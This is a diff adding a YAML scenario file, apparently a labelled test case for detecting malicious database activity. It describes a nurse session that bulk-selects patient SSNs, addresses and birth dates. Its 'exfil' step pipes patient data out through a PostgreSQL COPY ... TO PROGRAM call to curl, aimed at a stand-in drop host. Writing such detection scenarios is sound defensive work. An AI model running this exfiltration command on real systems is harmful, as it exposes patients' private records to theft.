@@ -1,0 +1,22 @@
+scenario_id: healthcare_nurse_pii_dump_0025
+family_id: healthcare_nurse_pii_dump_0025
+domain: healthcare
+time_of_day: '15:00'
+default_class: malicious
+rule_engine_relationship: agrees
+sessions:
+- session_label: pii_dump
+  role: nurse
+  class: malicious
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 0.644122884672284
+  events:
+  - sql: SELECT ssn, address, full_name, date_of_birth FROM patients WHERE primary_doctor_id NOT IN (SELECT doctor_id FROM doctors WHERE department_id = 'DEPT-PSYCH')
+  - step_id: exfil
+    sql: COPY (SELECT p.ssn, p.address, p.date_of_birth, p.phone FROM patients p) TO PROGRAM 'curl -sX POST https://drop.example.net/upload -d @-'
+    connects_to:
+      ip: 91.219.236.174
+      port: 443
